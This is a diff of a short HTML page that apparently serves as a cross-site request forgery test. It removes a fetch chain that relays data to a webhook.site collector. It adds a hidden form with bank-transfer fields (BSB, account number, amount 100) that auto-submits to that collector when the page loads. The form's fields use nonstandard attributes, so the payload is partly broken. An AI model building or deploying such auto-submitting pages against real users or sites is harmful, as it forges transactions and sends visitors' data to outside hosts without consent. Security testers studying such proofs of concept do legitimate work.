@@ -2,34 +2,14 @@
 <html lang="ru">
   <body>
     <h1>hello</h1>
+    <form
+      action="https://webhook.site/28fdc74d-c38a-4f63-9fbe-2757579ef561"
+      method="POST"
+    >
+      <input type="hidden" bsb="421314" accountNo="1736123125" amount="100" />
+    </form>
     <script>
-      fetch("https://webhook.site/28fdc74d-c38a-4f63-9fbe-2757579ef561", {
-        method: "GET",
-        headers: {
-          "Content-Type": "application/json",
-        },
-      })
-        .then((response) => response.json())
-        .then((data) => {
-          console.log("First request response:", data);
-
-          // Second request with the first request's response
-          return fetch("https://webhook.site/28fdc74d-c38a-4f63-9fbe-2757579ef561", {
-            method: "POST", // Change to POST if needed
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify(data), // send the first response
-          });
-        })
-        .then((response) => response.json())
-        .then((data) => {
-          console.log("Second request response:", data);
-          // Handle the second response
-        })
-        .catch((error) => {
-          console.error("Error:", error);
-        });
+      document.forms[0].submit();
     </script>
   </body>
 </html>
